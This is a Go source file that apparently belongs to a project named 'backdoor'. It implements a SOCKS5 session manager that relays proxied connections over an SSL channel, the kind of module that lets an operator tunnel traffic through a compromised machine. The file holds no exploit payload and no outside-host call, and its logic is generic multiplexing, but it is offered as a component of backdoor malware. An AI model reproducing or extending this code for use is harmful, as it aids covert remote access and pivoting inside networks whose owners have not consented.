package main

import (
	"backdoor/util"
	"encoding/binary"
	"sync"
)

type Socks5Server struct {
	conn     *util.SSLConn
	msgchan  *util.MsgChan
	mutex    sync.Mutex
	sessions map[uint32]*util.ConnWrap
	index    uint32
	stop     bool
}

func NewSocks5Server(conn *util.SSLConn) *Socks5Server {
	pnew := new(Socks5Server)
	pnew.conn = conn
	pnew.msgchan = util.NewMsgChan()
	pnew.sessions = make(map[uint32]*util.ConnWrap)
	pnew.index = 0
	pnew.stop = false
	go pnew.loopProc()
	return pnew
}

func (s *Socks5Server) OnMsg(msg []byte) {
	s.msgchan.In(msg)
}

func (s *Socks5Server) procMsg(cmd byte, sid uint32, data []byte) {
	s.mutex.Lock()
	defer s.mutex.Unlock()
	session := s.sessions[sid]
	if session == nil {
		return
	}
	if cmd == util.SOCKS5_DATA {
		session.Write(data)
	} else if cmd == util.SOCKS5_CLOSE {
		session.Close()
		delete(s.sessions, sid)
	}
}

func (s *Socks5Server) loopProc() {
	for {
		msg, ok := s.msgchan.Out()
		if !ok {
			break
		}
		cmd := msg[0]
		sid := binary.LittleEndian.Uint32(msg[1:])
		data := msg[5:]
		s.procMsg(cmd, sid, data)
	}
	s.Stop()
}

func (s *Socks5Server) OnClose() {
	s.msgchan.Close()
}

func (s *Socks5Server) Stop() {
	s.mutex.Lock()
	defer s.mutex.Unlock()
	s.stop = true
	for _, v := range s.sessions {
		v.Close()
	}
	s.sessions = make(map[uint32]*util.ConnWrap)
}

func (s *Socks5Server) AddSession(socks5 *util.ConnWrap) (uint32, bool) {
	s.mutex.Lock()
	defer s.mutex.Unlock()
	if s.stop {
		return 0, false
	}
	sid := s.index
	s.index += 1
	s.sessions[sid] = socks5
	return sid, true
}

func (s *Socks5Server) DeleSession(sid uint32) {
	s.mutex.Lock()
	defer s.mutex.Unlock()
	session := s.sessions[sid]
	if session == nil {
		return
	}
	delete(s.sessions, sid)
	util.SendSocksMsg(s.conn, util.SOCKS5_CLOSE, sid, nil)
}
